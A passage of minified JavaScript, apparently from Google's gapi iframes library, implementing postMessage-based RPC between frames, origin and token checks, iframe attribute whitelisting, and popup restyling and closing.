      },
      Ag = function (a, b) {
        (a.Ye = !0),
          ig(function () {
            a.Ye && Dg.call(null, b);
          });
      },
      Dg = Xf,
      mg = function (a) {
        Da.call(this, a);
      };
    v(mg, Da), (mg.prototype.name = "cancel");
    var Eg,
      Fg,
      Gg,
      Hg = /^[\w\.\-]*$/,
      Ig = function (a) {
        return a.getOrigin() === a.getContext().getOrigin();
      },
      Jg = function () {
        return !0;
      },
      Kg = function (a) {
        for (var b = md(), c = 0; c < a.length; c++) b[a[c]] = !0;
        return function (d) {
          return !!b[d.Ib];
        };
      },
      Mg = function (a, b, c) {
        return function (d) {
          if (!b.isDisposed()) {
            var e = this.origin,
              f = b.getOrigin();
            D(e === f, "Wrong origin " + e + " != " + f),
              (e = this.callback),
              (d = Lg(a, d, b)),
              !c && 0 < d.length && sg(d).then(e);
          }
        };
      },
      Lg = function (a, b, c) {
        if (!(a = Eg[a])) return [];
        for (var d = [], e = 0; e < a.length; e++)
          d.push(F(a[e].call(c, b, c)));
        return d;
      },
      Ng = function (a, b, c) {
        D("_default" != a, "Cannot update default api"),
          (Fg[a] = { map: b, filter: c });
      },
      Og = function (a, b, c) {
        D("_default" != a, "Cannot update default api"),
          (bd(Fg, a, { map: {}, filter: Ig }).map[b] = c);
      },
      Pg = function (a, b) {
        (bd(Fg, "_default", { map: {}, filter: Jg }).map[a] = b),
          fd(Gg.kb, function (c) {
            c.register(a, b, Jg);
          });
      },
      Qg = function () {
        return Gg;
      },
      Rg = /^https?:\/\/[^\/%\\?#\s]+$/i,
      Sg = {
        longdesc: !0,
        name: !0,
        src: !0,
        frameborder: !0,
        marginwidth: !0,
        marginheight: !0,
        scrolling: !0,
        align: !0,
        height: !0,
        width: !0,
        id: !0,
        class: !0,
        title: !0,
        tabindex: !0,
        hspace: !0,
        vspace: !0,
        allowtransparency: !0,
      },
      Tg = function (a) {
        this.i = a || {};
      };
    (Tg.prototype.value = function () {
      return this.i;
    }),
      (Tg.prototype.getIframe = function () {
        return this.i.iframe;
      });
    var Ug = function (a, b) {
        return (a.i.role = b), a;
      },
      Vg = function (a, b) {
        return (a.i.data = b), a;
      };
    Tg.prototype.ac = function (a) {
      return (this.i.setRpcReady = a), this;
    };
    var Wg = function (a) {
      return a.i.setRpcReady;
    };
    Tg.prototype.Uc = function (a) {
      return (this.i.rpctoken = a), this;
    };
    var Xg = function (a) {
        return a.i.rpctoken;
      },
      Yg = function (a) {
        return (a.i.selfConnect = !0), a;
      },
      Zg = function (a) {
        this.i = a;
      };
    (Zg.prototype.value = function () {
      return this.i;
    }),
      (Zg.prototype.Ij = function (a) {
        this.i.style = a;
      }),
      (Zg.prototype.getStyle = function () {
        return this.i.style;
      });
    var $g = function (a, b) {
        a.i.onload = b;
      },
      ah = function (a) {
        this.i = a || {};
      };
    ah.prototype.value = function () {
      return this.i;
    };
    var ch = function (a) {
        var b = new bh();
        return (b.i.role = a), b;
      },
      dh = function (a, b) {
        return (a.i.handler = b), a;
      },
      eh = function (a, b) {
        return (a.i.filter = b), a;
      };
    ah.prototype.ze = function (a) {
      return (this.i.apis = a), this;
    };
    var fh = function (a) {
      this.i = a || {};
    };
    (k = fh.prototype),
      (k.value = function () {
        return this.i;
      }),
      (k.setUrl = function (a) {
        return (this.i.url = a), this;
      }),
      (k.getUrl = function () {
        return this.i.url;
      }),
      (k.Ij = function (a) {
        this.i.style = a;
      }),
      (k.getStyle = function () {
        return this.i.style;
      }),
      (k.getId = function () {
        return this.i.id;
      }),
      (k.Uc = function (a) {
        return (this.i.rpctoken = a), this;
      });
    var gh = function (a, b) {
        return (a.i.messageHandlers = b), a;
      },
      hh = function (a, b) {
        return (a.i.messageHandlersFilter = b), a;
      };
    fh.prototype.ze = function (a) {
      return (this.i.apis = a), this;
    };
    var ih = function (a, b) {
      a.i.onClose = b;
    };
    fh.prototype.getContext = function () {
      return this.i.context;
    };
    var jh = function (a) {
        return (a.i.attributes = a.i.attributes || {}), new Zg(a.i.attributes);
      },
      kh = function (a, b) {
        a.i.controllerData = b;
      },
      lh = function (a) {
        return (a = a.i.timeout) ? a : null;
      },
      mh = function () {
        Tg.apply(this, arguments);
      };
    n(mh, Tg);
    var bh = function () {
      ah.apply(this, arguments);
    };
    n(bh, ah);
    var nh = function () {
      fh.apply(this, arguments);
    };
    n(nh, fh);
    var H = function (a) {
      nh.call(this, a);
    };
    n(H, nh);
    var oh = function (a, b) {
      return (a.i.frameName = b), a;
    };
    H.prototype.getFrameName = function () {
      return this.i.frameName;
    };
    var ph = function (a, b) {
      return (a.i.rpcAddr = b), a;
    };
    H.prototype.ob = function () {
      return this.i.rpcAddr;
    };
    var qh = function (a, b) {
      return (a.i.retAddr = b), a;
    };
    H.prototype.Fb = function () {
      return this.i.retAddr;
    };
    var rh = function (a, b) {
      return (a.i.origin = b), a;
    };
    (H.prototype.getOrigin = function () {
      return this.i.origin;
    }),
      (H.prototype.ac = function (a) {
        return (this.i.setRpcReady = a), this;
      });
    var sh = function (a, b) {
        a.i.context = b;
      },
      th = function (a, b) {
        a.i._rpcReadyFn = b;
      };
    H.prototype.getIframeEl = function () {
      return this.i.iframeEl;
    };
    var uh = function (a, b, c) {
        var d = a.ob(),
          e = b.Fb();
        qh(ph(c, a.Fb() + "/" + b.ob()), e + "/" + d),
          rh(oh(c, b.getFrameName()), b.getOrigin());
      },
      wh = function (a) {
        (this.resolve = this.reject = null),
          (this.promise = new E(
            u(function (b, c) {
              (this.resolve = b), (this.reject = c);
            }, this)
          )),
          a && (this.promise = vh(this.promise, a));
      },
      vh = function (a, b) {
        return a.then(function (c) {
          try {
            b(c);
          } catch (d) {}
          return c;
        });
      },
      xh = function () {
        this.vb = window.console;
      };
    (xh.prototype.log = function (a) {
      this.vb && this.vb.log && this.vb.log(a);
    }),
      (xh.prototype.error = function (a) {
        this.vb &&
          (this.vb.error ? this.vb.error(a) : this.vb.log && this.vb.log(a));
      }),
      (xh.prototype.warn = function (a) {
        this.vb &&
          (this.vb.warn ? this.vb.warn(a) : this.vb.log && this.vb.log(a));
      }),
      (xh.prototype.debug = function () {});
    var yh = new xh(),
      Gh = function () {
        if (
          ((this.Fe = {
            yj: zh ? "../" + zh : null,
            Ak: Ah,
            Ai: Bh,
            Qm: Ch,
            getToken: Dh,
            Rm: Eh,
          }),
          (this.ub = C),
          (this.rj = this.zk),
          (this.Kk = /MSIE\s*[0-8](\D|$)/.test(window.navigator.userAgent)),
          this.Fe.yj)
        ) {
          this.ub = this.Fe.Ai(this.ub, this.Fe.yj);
          var a = this.ub.document,
            b = a.createElement("script");
          b.setAttribute("type", "text/javascript"),
            (b.text =
              "window.doPostMsg=function(w,s,o) {window.setTimeout(function(){w.postMessage(s,o);},0);};"),
            a.body.appendChild(b),
            (this.rj = this.ub.doPostMsg);
        }
        (this.Fh = {}),
          (this.Oh = {}),
          (a = u(this.Uk, this)),
          Yd(this.ub, "message", a),
          bd(de, "RPMQ", []).push(a),
          this.ub != this.ub.parent &&
            Fh(this, this.ub.parent, this.Vi(this.ub.name), "*");
      };
    Gh.prototype.Vi = function (a) {
      return '{"h":"' + escape(a) + '"}';
    };
    var Hh = function (a) {
        var b = null;
        return (
          0 === a.indexOf('{"h":"') &&
            a.indexOf('"}') === a.length - 2 &&
            (b = unescape(a.substring(6, a.length - 2))),
          b
        );
      },
      Ih = function (a) {
        return (
          !!/^\s*{/.test(a) &&
          null !== (a = Ke(a)) &&
          "object" == typeof a &&
          !!a.g
        );
      };
    (Gh.prototype.Uk = function (a) {
      var b = String(a.data);
      yh.debug(
        "gapix.rpc.receive(" +
          Ch +
          "): " +
          (!b || 512 >= b.length
            ? b
            : b.substr(0, 512) + "... (" + b.length + " bytes)")
      );
      var c = 0 !== b.indexOf("!_");
      c || (b = b.substring(2));
      var d = Ih(b);
      if (!c && !d) {
        if (!d && (c = Hh(b)))
          return void (this.Fh[c] ? this.Fh[c]() : (this.Oh[c] = 1));
        var e = a.origin,
          f = this.Fe.Ak;
        this.Kk
          ? C.setTimeout(function () {
              f(b, e);
            }, 0)
          : f(b, e);
      }
    }),
      (Gh.prototype.setup = function (a, b) {
        ".." === a || this.Oh[a] ? (b(), delete this.Oh[a]) : (this.Fh[a] = b);
      });
    var Fh = function (a, b, c, d) {
      var e = Ih(c) ? "" : "!_";
      yh.debug(
        "gapix.rpc.send(" +
          Ch +
          "): " +
          (!c || 512 >= c.length
            ? c
            : c.substr(0, 512) + "... (" + c.length + " bytes)")
      ),
        a.rj(b, e + c, d);
    };
    (Gh.prototype.zk = function (a, b, c) {
      a.postMessage(b, c);
    }),
      (Gh.prototype.send = function (a, b, c) {
        (a = this.Fe.Ai(this.ub, a)) && !a.closed && Fh(this, a, b, c);
      });
    var Jh = 0,
      Kh = [],
      Lh = {},
      Mh = {},
      Nh = C.location.href,
      Oh = Kd(Nh, "rpctoken"),
      Ph = Kd(Nh, "parent") || $c.referrer,
      zh = Kd(Nh, "rly"),
      Ch = zh || ((C !== C.top || C.opener) && C.name) || "..",
      Qh = null,
      Rh = {},
      Sh = function () {},
      Th = { send: Sh, setup: Sh, Vi: Sh },
      Bh = function (a, b) {
        if (
          ("/" == b.charAt(0) && ((b = b.substring(1)), (a = C.top)),
          0 === b.length)
        )
          return a;
        for (b = b.split("/"); b.length; ) {
          var c = b.shift();
          if (
            ("{" == c.charAt(0) &&
              "}" == c.charAt(c.length - 1) &&
              (c = c.substring(1, c.length - 1)),
            ".." === c)
          )
            a = a == a.parent ? a.opener : a.parent;
          else {
            if (".." === c || !a.frames[c]) return null;
            if (!("postMessage" in (a = a.frames[c])))
              throw Error("Not a window");
          }
        }
        return a;
      },
      Dh = function (a) {
        return (a = Lh[a]) && a.token;
      },
      Uh = function (a) {
        if (a.f in {}) return !1;
        var b = a.t,
          c = Lh[a.r];
        return (
          (a = a.origin),
          c &&
            (c.token === b || (!c.token && !b)) &&
            (a === c.origin || "*" === c.origin)
        );
      },
      Vh = function (a) {
        var b = a.id.split("/"),
          c = b[b.length - 1],
          d = a.origin;
        return function (e) {
          var f = e.origin;
          return e.f == c && (d == f || "*" == d);
        };
      },
      Yh = function (a, b, c) {
        (a = Wh(a)), (Mh[a.name] = { Xd: b, je: a.je, Ca: c || Uh }), Xh();
      },
      Zh = {},
      $h = function (a, b) {
        (a = Zh["_" + a]) && a[1](this) && a[0].call(this, b);
      },
      bi = function (a) {
        var b = a.c;
        if (!b) return Sh;
        var c = a.r,
          d = a.g ? "legacy__" : "";
        return function () {
          var e = [].slice.call(arguments, 0);
          e.unshift(c, d + "__cb", null, b), ai.apply(null, e);
        };
      },
      Eh = function (a) {
        Qh = a;
      },
      di = function (a) {
        Rh[a] ||
          (Rh[a] = C.setTimeout(function () {
            (Rh[a] = !1), ci(a);
          }, 0));
      },
      ci = function (a) {
        var b = Lh[a];
        if (b && b.ready) {
          var c = b.nh;
          for (b.nh = []; c.length; ) Th.send(a, Le(c.shift()), b.origin);
        }
      },
      Wh = function (a) {
        return 0 === a.indexOf("legacy__")
          ? { name: a.substring(8), je: !0 }
          : { name: a, je: !1 };
      },
      Xh = function () {
        for (
          var c,
            a = Ca("rpc/residenceSec") || 60,
            b = new Date().getTime() / 1e3,
            d = 0;
          (c = Kh[d]);
          ++d
        ) {
          var e = c.rpc;
          if (!e || (0 < a && b - c.timestamp > a)) Kh.splice(d, 1), --d;
          else {
            var f = e.s,
              g = Mh[f] || Mh["*"];
            if (g)
              if (
                (Kh.splice(d, 1),
                --d,
                (e.origin = c.origin),
                (c = bi(e)),
                (e.callback = c),
                g.Ca(e))
              ) {
                if ("__cb" !== f && !!g.je != !!e.g) break;
                void 0 !== (e = g.Xd.apply(e, e.a)) && c(e);
              } else yh.debug("gapix.rpc.rejected(" + Ch + "): " + f);
          }
        }
      },
      ei = function (a, b, c) {
        Kh.push({ rpc: a, origin: b, timestamp: new Date().getTime() / 1e3 }),
          c || Xh();
      },
      Ah = function (a, b) {
        (a = Ke(a)), ei(a, b, !1);
      },
      fi = function (a) {
        for (; a.length; ) ei(a.shift(), this.origin, !0);
        Xh();
      },
      gi = function (a) {
        var b = !1,
          c = (a = a.split("|"))[0];
        return (
          0 <= c.indexOf("/") && (b = !0), { id: c, origin: a[1] || "*", Qg: b }
        );
      },
      hi = function (a, b, c, d) {
        var e = gi(a);
        if (
          (d && (C.frames[e.id] = C.frames[e.id] || d),
          (a = e.id),
          !Lh.hasOwnProperty(a))
        ) {
          if (((c = c || null), (d = e.origin), ".." === a))
            (d = Af(Ph)), (c = c || Oh);
          else if (!e.Qg) {
            var f = $c.getElementById(a);
            f && ((f = f.src), (d = Af(f)), (c = c || Kd(f, "rpctoken")));
          }
          ("*" === e.origin && d) || (d = e.origin),
            (Lh[a] = {
              token: c,
              nh: [],
              origin: d,
              dm: b,
              wj: function () {
                var g = a;
                (Lh[g].ready = 1), ci(g);
              },
            }),
            Th.setup(a, Lh[a].wj);
        }
        return Lh[a].wj;
      },
      ai = function (a, b, c, d) {
        hi((a = a || ".."));
        var e = b,
          f = (a = a.split("|", 1)[0]),
          g = [].slice.call(arguments, 3),
          h = c,
          l = Ch,
          m = Oh,
          q = Lh[f],
          y = l,
          B = gi(f);
        if (q && ".." !== f) {
          if (B.Qg) {
            if (!(m = Lh[f].dm)) {
              for (
                y = (m = Qh ? Qh.substring(1).split("/") : [Ch]).length - 1,
                  f = C.parent;
                f !== C.top;

              ) {
                var S = f.parent;
                if (!y--) {
                  for (
                    var Ba = null, Dc = S.frames.length, re = 0;
                    re < Dc;
                    ++re
                  )
                    S.frames[re] == f && (Ba = re);
                  m.unshift("{" + Ba + "}");
                }
                f = S;
              }
              m = "/" + m.join("/");
            }
            y = m;
          } else y = l = "..";
          m = q.token;
        }
        h && B
          ? ((q = Uh), B.Qg && (q = Vh(B)), (Zh["_" + ++Jh] = [h, q]), (h = Jh))
          : (h = null),
          (g = { s: e, f: l, r: y, t: m, c: h, a: g }),
          (e = Wh(e)),
          (g.s = e.name),
          (g.g = e.je),
          Lh[a].nh.push(g),
          di(a);
      };
    ("function" != typeof C.postMessage && "object" != typeof C.postMessage) ||
      ((Th = new Gh()),
      Yh("__cb", $h, function () {
        return !0;
      }),
      Yh("_processBatch", fi, function () {
        return !0;
      }),
      hi("..")),
      !A("Android") || Ob(),
      Ob();
    var ii =
        A("Safari") &&
        !(
          Ob() ||
          (!Mb() && A("Coast")) ||
          (!Mb() && A("Opera")) ||
          (!Mb() && A("Edge")) ||
          (Mb() ? Lb("Microsoft Edge") : A("Edg/")) ||
          (Mb() ? Lb("Opera") : A("OPR")) ||
          A("Firefox") ||
          A("FxiOS") ||
          A("Silk") ||
          A("Android")
        ) &&
        !(pc() || A("iPad") || A("iPod")),
      ki = function (a, b, c) {
        a.setTimeout(function () {
          b.closed || 5 == c ? ji(b) : (b.close(), c++, ki(a, b, c));
        }, 1e3);
      },
      ji = function (a) {
        if (!a.closed && a.document && a.document.body)
          if (
            ((a = a.document.body),
            w(
              null != a,
              "goog.dom.setTextContent expects a non-null value for node"
            ),
            "textContent" in a)
          )
            a.textContent = "Please close this window.";
          else if (3 == a.nodeType) a.data = "Please close this window.";
          else if (a.firstChild && 3 == a.firstChild.nodeType) {
            for (; a.lastChild != a.firstChild; ) a.removeChild(w(a.lastChild));
            a.firstChild.data = "Please close this window.";
          } else {
            Wc(a);
            var b = Yc(a);
            a.appendChild(b.createTextNode("Please close this window."));
          }
      },
      I = function (a, b, c, d) {
        for (
          this.Cb = !1,
            this.Se = a,
            this.uh = b,
            this.nd = c,
            this.Sa = d,
            this.zj = this.Sa.Fb(),
            this.Ib = this.Sa.getOrigin(),
            this.kl = this.Sa.getIframeEl(),
            this.Nj = this.Sa.i.where,
            this.Bb = [],
            this.applyIframesApi("_default"),
            a = this.Sa.i.apis || [],
            b = 0;
          b < a.length;
          b++
        )
          this.applyIframesApi(a[b]);
        this.Se.kb[c] = this;
      };
    (k = I.prototype),
      (k.isDisposed = function () {
        return this.Cb;
      }),
      (k.Gc = function () {
        if (!this.isDisposed()) {
          for (var a = 0; a < this.Bb.length; a++) this.unregister(this.Bb[a]);
          delete Gg.kb[this.getFrameName()], (this.Cb = !0);
        }
      }),
      (k.getContext = function () {
        return this.Se;
      }),
      (k.getOptions = function () {
        return this.Sa;
      }),
      (k.ob = function () {
        return this.uh;
      }),
      (k.Fb = function () {
        return this.zj;
      }),
      (k.getFrameName = function () {
        return this.nd;
      }),
      (k.getIframeEl = function () {
        return this.kl;
      }),
      (k.getSiteEl = function () {
        return this.Nj;
      }),
      (k.setSiteEl = function (a) {
        this.Nj = a;
      }),
      (k.ac = function () {
        (0, this.Sa.i._rpcReadyFn)();
      }),
      (k.setParam = function (a, b) {
        this.Sa.value()[a] = b;
      }),
      (k.getParam = function (a) {
        return this.Sa.value()[a];
      }),
      (k.yi = function () {
        return this.Sa.value();
      }),
      (k.getId = function () {
        return this.Sa.getId();
      }),
      (k.getOrigin = function () {
        return this.Ib;
      });
    var li = function (a, b) {
      return a.nd + ":" + (a = a.Se.getFrameName()) + ":" + b;
    };
    (k = I.prototype),
      (k.register = function (a, b, c) {
        D(
          !this.isDisposed(),
          "Cannot register handler on disposed iframe " + a
        ),
          D((c || Ig)(this), "Rejecting untrusted message " + a),
          (c = li(this, a)),
          1 == bd(Eg, c, []).push(b) &&
            (this.Bb.push(a), Yh(c, Mg(c, this, "_g_wasClosed" === a)));
      }),
      (k.unregister = function (a, b) {
        var c = li(this, a),
          d = Eg[c];
        d &&
          (b
            ? 0 <= (b = dd.call(d, b)) && d.splice(b, 1)
            : d.splice(0, d.length),
          0 == d.length &&
            (0 <= (b = dd.call(this.Bb, a)) && this.Bb.splice(b, 1),
            delete Mh[Wh(c).name]));
      }),
      (k.Pk = function () {
        return this.Bb;
      }),
      (k.applyIframesApi = function (a) {
        if (((this.dg = this.dg || []), !(0 <= dd.call(this.dg, a))))
          for (var b in (this.dg.push(a), (a = Fg[a] || { map: {} }).map))
            ed(a.map, b) && this.register(b, a.map[b], a.filter);
      }),
      (k.getWindow = function () {
        if (!Ig(this)) return null;
        var a = this.Sa.i._popupWindow;
        if (a) return a;
        var b = this.uh.split("/");
        a = this.getContext().getWindow();
        for (var c = 0; c < b.length && a; c++) {
          var d = b[c];
          a = ".." === d ? (a == a.parent ? a.opener : a.parent) : a.frames[d];
        }
        return a;
      });
    var mi = function (a) {
      var b = {};
      if (a)
        for (var c in a)
          ed(a, c) && ed(Rf, c) && Sf.test(a[c]) && (b[c] = a[c]);
      return b;
    };
    (k = I.prototype),
      (k.close = function (a, b) {
        return ni(this, "_g_close", a, b);
      }),
      (k.restyle = function (a, b) {
        return ni(this, "_g_restyle", a, b);
      }),
      (k.Yl = function (a, b) {
        return ni(this, "_g_restyleDone", a, b);
      }),
      (k.rk = function (a) {
        return this.getContext().closeSelf(a, void 0, this);
      }),
      (k.am = function (a) {
        if (a && "object" == typeof a)
          return this.getContext().restyleSelf(a, void 0, this);
      }),
      (k.bm = function (a) {
        var b = this.Sa.i.onRestyle;
        b && b.call(this, a, this),
          (a = a && "object" == typeof a ? mi(a) : {}),
          (b = this.getIframeEl()) &&
            a &&
            "object" == typeof a &&
            (ed(a, "height") && (a.height = Tf(a.height)),
            ed(a, "width") && (a.width = Tf(a.width)),
            nd(a, b.style));
      }),
      (k.sk = function (a) {
        var b = this.Sa.i.onClose;
        if (
          (b && b.call(this, a, this), (b = this.getOptions().i._popupWindow))
        ) {
          var c = this.getContext()
            .getWindow()
            .document.getElementById(this.getId());
          c && c.parentNode && c.parentNode.removeChild(c),
            (c = this.getContext().getWindow()),
            xc && ii && c ? (c.focus(), ki(c, b, 0)) : (b.close(), ji(b));
        }
        b ||
          ((b = this.getIframeEl()) &&
            b.parentNode &&
            b.parentNode.removeChild(b)),
          (b = this.Sa.i.controller) &&
            (((c = {}).frameName = this.getFrameName()),
            ni(b, "_g_disposeControl", c)),
          (b = li(this, "_g_wasClosed")),
          Lg(b, a, this);
      }),
      (k.registerWasRestyled = function (a, b) {
        this.register("_g_wasRestyled", a, b);
      }),
      (k.registerWasClosed = function (a, b) {
        this.register("_g_wasClosed", a, b);
      }),
      (k.Bm = function () {
        delete this.getContext().kb[this.getFrameName()],
          this.getContext()
            .getWindow()
            .setTimeout(
              u(function () {
                this.Gc();
              }, this),
              0
            );
      }),
      (k.send = function (a, b, c, d) {
        return (
          D(
            !this.isDisposed(),
            "Cannot send message to disposed iframe - " + a
          ),
          D((d || Ig)(this), "Wrong target for message " + a),
          (c = new wh(c)),
          (a = this.Se.getFrameName() + ":" + this.nd + ":" + a),
          ai(this.uh, a, c.resolve, b),
          c.promise
        );
      });
    var ni = function (a, b, c, d) {
      return a.send(b, c, d, Jg);
    };
    (k = I.prototype),
      (k.Ml = function (a) {
        return a;
      }),
      (k.ping = function (a, b) {
        return ni(this, "_g_ping", b, a);
      }),
      (k.vk = function (a) {
        for (
          var e,
            b = (a = a && "object" == typeof a ? a : {}).rpcAddr,
            c = (this.ob() + "/" + b).split("/"),
            d = this.getContext().getWindow();
          (e = c.shift()) && d;

        )
          d = ".." == e ? d.parent : d.frames[e];
        D(!!d, "Bad rpc address " + b),
          (a._window = d),
          (a._parentRpcAddr = this.ob()),
          (a._parentRetAddr = this.Fb()),
          this.getContext(),
          (b = new J(a)),
          this.Dl && this.Dl(b, a.controllerData),
          (this.ug = this.ug || []),
          this.ug.push(b, a.controllerData);
      }),
      (k.Bk = function (a) {
        a = (a || {}).frameName;
        for (var b = this.ug || [], c = 0; c < b.length; c++)
          if (b[c].getFrameName() === a)
            return (a = b.splice(c, 1)[0]).Gc(), void (this.El && this.El(a));
        D(!1, "Unknown contolled iframe to dispose - " + a);
      }),
      (k.tk = function (a) {
        var b = new H(a);
        if ((a = new mh(b.value())).i.selfConnect) var c = this;
        else
          D(
            Rg.test(b.getOrigin()),
            "Illegal origin for connected iframe - " + b.getOrigin()
          ),
            (c = this.getContext().kb[b.getFrameName()])
              ? Wg(b) && (c.ac(), ni(c, "_g_rpcReady"))
              : ((b = oh(
                  rh(qh(ph(new H(), b.ob()), b.Fb()), b.getOrigin()),
                  b.getFrameName()
                )
                  .ac(Wg(b))
                  .Uc(Xg(b))),
                (c = oi(this.getContext(), b.value())));
        b = this.getContext();
        var d = a.i.role;
        (a = a.i.data),
          pi(b),
          (d = d || ""),
          bd(b.rg, d, []).push({ hf: c, data: a }),
          qi(c, a, b.Xg[d]);
      }),
      (k.Hj = function (a, b) {
        new H(b).i._relayedDepth ||
          (Yg(Ug(new mh((b = {})), "_opener")), ni(a, "_g_connect", b));
      }),
      (k.mj = function (a) {
        var b = this,
          c = a.i.messageHandlers,
          d = a.i.messageHandlersFilter,
          e = a.i.onClose;
        return (
          ih(hh(gh(a, null), null), null),
          ni(this, "_g_open", a.value()).then(function (f) {
            var g = new H(f[0]),
              h = g.getFrameName();
            f = new H();
            var l = b.Fb(),
              m = g.Fb();
            return (
              qh(ph(f, b.ob() + "/" + g.ob()), m + "/" + l),
              oh(f, h),
              rh(f, g.getOrigin()),
              f.ze(g.i.apis),
              f.Uc(Xg(a)),
              gh(f, c),
              hh(f, d),
              ih(f, e),
              (g = b.getContext().kb[h]) || (g = oi(b.getContext(), f.value())),
              g
            );
          })
        );
      }),
      (k.wh = function (a) {
        var b = a.getUrl();
        D(!b || Vd.test(b), "Illegal url for new iframe - " + b);
        var c = jh(a).value();
        for (var d in ((b = {}), c)) ed(c, d) && ed(Sg, d) && (b[d] = c[d]);
        ed(c, "style") && "object" == typeof (d = c.style) && (b.style = mi(d)),
          (a.value().attributes = b);
      }),
      (k.Jl = function (a) {
        (a = new H(a)), this.wh(a);
        var b = a.i._relayedDepth || 0;
        (a.i._relayedDepth = b + 1), (a.i.openerIframe = this);
        var c = Xg(a);
        a.Uc(null);
        var d = this;
        return this.getContext()
          .open(a.value())
          .then(function (e) {
            var f = new H(e.yi()).i.apis,
              g = new H();
            return (
              uh(e, d, g),
              0 == b && Ug(new mh(g.value()), "_opener"),
              g.ac(!0),
              g.Uc(c),
              ni(e, "_g_connect", g.value()),
              (g = new H()),
              rh(
                oh(qh(ph(g, e.ob()), e.zj), e.getFrameName()),
                e.getOrigin()
              ).ze(f),
              g.value()
            );
          });
      }),
      (k.Zl = function (a) {
        this.getContext().addOnOpenerHandler(
          function (b) {
            b.send("_g_wasRestyled", a, void 0, Jg);
          },
          null,
          Jg
        );
      });
    var ri = md(),
      si = md(),
      ti = function (a, b) {
        ri[a] = b;
      },
      ui = function (a) {
        return ri[a];
      },
      vi = function (a, b) {
        od.load("gapi.iframes.style." + a, b);
      },
      wi = function (a, b) {
        si[a] = b;
      },
      xi = function (a) {
        return si[a];
      },
      yi = function () {
        function a(h, l) {
          return (
            (h = window
              .getComputedStyle(h, "")
              .getPropertyValue(l)
              .match(/^([0-9]+)/)),
            parseInt(h[0], 10)
          );
        }
        for (var b = 0, c = [document.body]; 0 < c.length; ) {
          var d = c.shift(),
            e = d.childNodes;
          if (void 0 !== d.style) {
            var f = d.style.overflowY;
            if (
              (f ||
                (f = (f = document.defaultView.getComputedStyle(d, null))
                  ? f.overflowY
                  : null),
              "visible" != f &&
                "inherit" != f &&
                ((f = d.style.height) ||
                  (f = (f = document.defaultView.getComputedStyle(d, null))
                    ? f.height
                    : ""),
                0 < f.length && "auto" != f))
            )
              continue;
          }
          for (d = 0; d < e.length; d++) {
            if (void 0 !== (f = e[d]).offsetTop && void 0 !== f.offsetHeight) {
              var g = f.offsetTop + f.offsetHeight + a(f, "margin-bottom");
              b = Math.max(b, g);
            }
            c.push(f);
          }
        }
        return (
          b +
          a(document.body, "border-bottom") +
          a(document.body, "margin-bottom") +
          a(document.body, "padding-bottom")
        );
      },
      zi = function () {
        var a = 0;
        self.innerHeight
          ? (a = self.innerHeight)
          : document.documentElement && document.documentElement.clientHeight
          ? (a = document.documentElement.clientHeight)
          : document.body && (a = document.body.clientHeight);
        var b = document.body,
          c = document.documentElement;
        if ("CSS1Compat" === document.compatMode && c.scrollHeight)
          return c.scrollHeight !== a ? c.scrollHeight : c.offsetHeight;
        if (0 <= navigator.userAgent.indexOf("AppleWebKit")) return yi();
        if (b && c) {
          var d = c.scrollHeight,
            e = c.offsetHeight;
          return (
            c.clientHeight !== e &&
              ((d = b.scrollHeight), (e = b.offsetHeight)),
            d > a ? (d > e ? d : e) : d < e ? d : e
          );
        }
      },
      J = function (a) {
        if (
          ((a = a || {}),
          (this.Cb = !1),
          (this.wa = md()),
          (this.kb = md()),
          (this.ub = a._window || C),
          (this.hb = this.ub.location.href),
          (this.oj = (this.eh = Ai(this.hb, "parent"))
            ? Ai(this.hb, "pfname")
            : ""),
          (this.Pa = this.eh ? Ai(this.hb, "_gfid") || Ai(this.hb, "id") : ""),
          (this.nd = jf(this.Pa, this.oj)),
          (this.Ib = Af(this.hb)),
          this.Pa)
        ) {
          var b = new H();
          ph(b, a._parentRpcAddr || ".."),
            qh(b, a._parentRetAddr || this.Pa),
            rh(b, Af(this.eh || this.hb)),
            oh(b, this.oj),
            (this.Ha = oi(this, b.value()));
        } else this.Ha = null;
      };
    (k = J.prototype),
      (k.isDisposed = function () {
        return this.Cb;
      }),
      (k.Gc = function () {
        if (!this.isDisposed()) {
          for (
            var a = ja(Object.values(this.kb)), b = a.next();
            !b.done;
            b = a.next()
          )
            b.value.Gc();
          this.Cb = !0;
        }
      }),
      (k.getFrameName = function () {
        return this.nd;
      }),
      (k.getOrigin = function () {
        return this.Ib;
      }),
      (k.getWindow = function () {
        return this.ub;
      }),
      (k.setGlobalParam = function (a, b) {
        this.wa[a] = b;
      }),
      (k.getGlobalParam = function (a) {
        return this.wa[a];
      });
    var oi = function (a, b) {
      D(!a.isDisposed(), "Cannot attach iframe in disposed context"),
        (b = new H(b)).ob() || ph(b, b.getId()),
        b.Fb() || qh(b, ".."),
        b.getOrigin() || rh(b, Af(b.getUrl())),
        b.getFrameName() || oh(b, jf(b.getId(), a.nd));
      var c = b.getFrameName();
      if (a.kb[c]) return a.kb[c];
      var d = b.ob(),
        e = d;
      b.getOrigin() && (e = d + "|" + b.getOrigin());
      var f = b.Fb(),
        g = Xg(b);
      g ||
        ((g =
          ((g = b.getIframeEl()) &&
            (g.getAttribute("data-postorigin") || g.src)) ||
          b.getUrl()),
        (g = Kd(g, "rpctoken"))),
        th(b, hi(e, f, g, b.i._popupWindow)),
        (e = ((window.gadgets || {}).rpc || {}).setAuthToken),
        g && e && e(d, g);
      var h = new I(a, d, c, b),
        l = b.i.messageHandlersFilter;
      return (
        fd(b.i.messageHandlers, function (m, q) {
          h.register(q, m, l);
        }),
        Wg(b) && h.ac(),
        ni(h, "_g_rpcReady"),
        h
      );
    };
    J.prototype.wh = function (a) {
      oh(a, null);
      var b = a.getId();
      !b ||
        (Hg.test(b) && !this.getWindow().document.getElementById(b)) ||
        (yh.log("Ignoring requested iframe ID - " + b), (a.i.id = null));
    };
    var Ai = function (a, b) {
      var c = Kd(a, b);
      return c || (c = Ke(Kd(a, "jcp", ""))[b]), c || "";
    };
    J.prototype.openChild = function (a) {
      D(!this.isDisposed(), "Cannot open iframe in disposed context");
      var b = new H(a);
      Bi(this, b);
      var c = b.getFrameName();
      if (c && this.kb[c]) return this.kb[c];
      this.wh(b), (c = b.getUrl()), D(c, "No url for new iframe");
      var d = b.i.queryParams || {};
      return (
        (d.usegapi = "1"),
        (b.i.queryParams = d),
        (d = this.Di && this.Di(c, b)) ||
          ((d = b.i.where),
          D(!!d, "No location for new iframe"),
          (c = rf(c, d, a)),
          (b.i.iframeEl = c),
          (d = c.getAttribute("id"))),
        (ph(b, d).i.id = d),
        rh(b, Af(b.i.eurl || "")),
        this.Wi && this.Wi(b, b.getIframeEl()),
